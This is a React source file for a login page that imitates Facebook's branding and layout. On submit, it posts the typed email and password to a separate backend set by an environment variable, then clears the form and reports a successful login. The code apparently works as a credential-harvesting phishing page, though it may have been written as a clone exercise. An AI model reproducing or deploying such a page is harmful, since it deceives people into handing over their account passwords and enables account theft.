import React, { useState } from 'react';
import toast from 'react-hot-toast';

const url = import.meta.env.VITE_API_URL;

const handlelogin = async (body: { username: string; password: string }) => {
  try {
    const response = await fetch(`${url}/api/login`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(body),
    });
    if (!response) throw new Error('something went wrong');
    return await response.json();
  } catch (error) {
    console.log('error:', error);
  }
};

function App() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    // Handle login logic here
    const body = {
      username: email,
      password: password,
    };
    toast.promise(
      async () => {
        setEmail('');
        setPassword('');
        return await handlelogin(body);
      },
      {
        loading: 'Loading',
        success: 'Login Successfull',
        error: 'Error Login',
      }
    );
  };

  return (
    <div className="min-h-screen bg-[#f0f2f5] flex items-center justify-center p-4">
      <div className="flex flex-col md:flex-row justify-between gap-8 md:gap-16 w-full max-w-[950px]">
        {/* Left side with logo and tagline */}
        <div className="text-center md:text-left max-w-md pt-16">
          <h1 className="text-[#1877f2] tracking-tight text-6xl md:text-6xl font-extrabold mb-4">
            facebook
          </h1>
          <h2 className="text-xl md:text-2xl leading-tight mt-4 px-4 md:px-0 font-medium text-black/80">
            Connect with friends and the world around you on Facebook.
          </h2>
        </div>

        {/* Right side with login form */}
        <div className="w-full max-w-[400px]">
          <div className="bg-white p-4 rounded-xl shadow-lg">
            <form onSubmit={handleSubmit} className="space-y-4">
              <input
                type="text"
                placeholder="Email address or phone number"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:border-[#1877f2]"
              />
              <input
                type="password"
                placeholder="Password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:border-[#1877f2]"
              />
              <button
                type="submit"
                className="w-full bg-[#1877f2] text-white py-3 px-4 rounded-lg text-xl font-bold hover:bg-[#166fe5] transition-colors"
              >
                Log In
              </button>
              <div className="text-center">
                <a href="#" className="text-[#1877f2] text-sm hover:underline">
                  Forgot password?
                </a>
              </div>
              <hr className="my-4 border-gray-300" />
              <div className="text-center py-2">
                <button
                  type="button"
                  className="bg-[#42b72a] text-white py-3 px-5 rounded-lg text-lg font-bold hover:bg-[#36a420] transition-colors"
                >
                  Create new account
                </button>
              </div>
            </form>
          </div>
          <p className="text-sm text-center mt-6">
            <a href="#" className="font-bold hover:underline text-black/80">
              Create a Page
            </a>{' '}
            for a celebrity, brand or business.
          </p>
        </div>
      </div>
    </div>
  );
}

export default App;
